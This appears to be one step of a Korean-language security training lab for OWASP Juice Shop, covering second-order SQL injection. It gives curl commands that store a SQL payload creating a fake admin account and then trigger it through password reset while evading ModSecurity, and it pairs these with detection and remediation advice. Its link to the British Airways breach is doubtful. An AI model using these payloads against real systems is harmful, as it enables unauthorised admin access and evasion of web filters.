# STEP 9 [RED·SQLi·Advanced] — Second-Order SQLi (저장 → 다른 페이지 의 실행)
# ============================================================
- order: 9
  instruction: |
    ## 🎯 MISSION

    Second-Order SQLi 는 *1단계 저장 시 무해* + *2단계 다른 페이지 에서 쿼리
    삽입 시 실행* 되는 두 단계 흐름. Juice Shop 의 회원가입 → 프로필 조회
    또는 password reset 시나리오 로 1, 2 단계 직접 시도. 1차 ModSecurity
    탐지 회피 + 2차 trigger.

    ## 💻 실행 명령

    ```bash
    # 1단계: 회원가입 시 username 에 SQL payload 삽입 (저장 시점 무해)
    echo "=== 1단계: payload 포함 회원가입 ==="
    PAYLOAD="evil'),(NULL,'admin2@juice-sh.op','MD5HASH','admin',NULL,NULL,NULL,NULL),('test"
    curl -s -i -X POST http://juice.6v6.lab/api/Users/ \
      -H 'Content-Type: application/json' \
      -d "{\"email\":\"${PAYLOAD}\",\"password\":\"test123\"}" | head -10
    # 응답: 200 (등록 성공) — payload 자체는 검증 안됨

    # 2단계: 저장된 username 이 다른 query 에서 사용되는 시점 (password reset)
    echo ""
    echo "=== 2단계: password reset trigger ==="
    curl -s -i -X POST http://juice.6v6.lab/rest/user/reset-password \
      -H 'Content-Type: application/json' \
      -d "{\"email\":\"evil'\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" \
      | head -10

    # 시나리오 다이어그램 출력
    echo ""
    cat <<'DIAG'
    === Second-Order SQLi 시나리오 ===

    1) 학생 등록 (insertOne 의 prepared statement → 안전)
       email = "evil'),(NULL,'admin2@...',MD5,'admin',...) "
       → DB 에 그대로 저장 (1차 검증 통과)

    2) password reset (저장된 email 을 query 에 string 결합)
       SQL = "SELECT * FROM Users WHERE email = '" + storedEmail + "'"
       → 저장된 payload 가 이때 SQL syntax 로 해석 → 다른 행/테이블 영향

    3) Blue 의 1차 ModSec 룰 = 회원가입 시점 트리거 안 됨 (payload 무해 형태)
       → 2차 (reset) 시점 의 SQL alert 만 가능
    DIAG
    ```

    ## 📋 확인 사항

    - 1단계 회원가입 응답: 200 OK + `{"data":{"id":N,"email":"..."}}` (정상 등록)
    - 2단계 reset 응답: 200 또는 500 + SQL 에러 (저장된 payload 가 query 에 결합)
    - 응답에 다른 user data 영향 (admin2 등 가짜 admin 생성 여부)
    - 1차 ModSecurity audit log 에는 *알림 없음* (payload 가 단순 string)

    ## 💡 왜 이걸 하는가?

    Second-Order SQLi 는 OWASP A03 의 high-severity 유형 — 1단계 ModSecurity /
    WAF 의 input filter 회피 가능 (저장 시 payload 가 단순 string). 2단계 의
    저장된 데이터를 *query 에 직접 결합* 하는 코드 (Sequelize 의 raw 옵션
    잘못 사용) 가 trigger. MITRE T1190 + CWE-89. 실 운영 사례 (2018 British
    Airways breach 의 변형) — 입력 검증만으로는 차단 불가.

    ## 🔵 Blue 측 관찰

    1단계 (회원가입) 의 ModSecurity audit log = 정상 (payload 가 단순 string).
    2단계 (reset) 시점에 SQL syntax 해석 → ModSec CRS rule 942100 (SQL Injection
    libinjection) 트리거 — 단, *src IP 는 reset 요청 한 IP* 라 1단계 등록한
    IP 와 다를 수 있음 → 추적 어려움. 운영자 SIEM 의 *Second-Order 연관 분석*
    필요 (저장 시점 + trigger 시점 간 user_id correlation).

    ## 🟣 Purple 보완 권장

    - **저장 + 사용 모두 parameterized**: Sequelize 의 `findOne({where: {email}})`
      자동 parameterized. raw query (`sequelize.query("SELECT ... WHERE email='"
      + storedEmail + "'", {raw:true})`) 절대 금지
    - **저장 시 input validation**: `express-validator` 의 `body('email').isEmail()`
      으로 SQL 메타문자 사전 거부 (Second-Order 도 동시 차단)
    - **출력 인코딩**: 저장된 데이터를 query 에 사용할 때 자동 sanitize 또는
      escape (sequelize.escape(storedEmail))
    - **SIEM correlation**: 저장 timestamp + trigger timestamp 의 user_id 매칭
      → 의심 user 의 모든 시점 audit
  hint: |
    1단계 (정상 등록 응답 200) + 2단계 (저장된 payload 가 query 에 결합 트리거)
    의 두 단계 흐름 시연 + ModSec 의 1단계 우회 (저장 시점 payload 가 단순
    string) 설명.
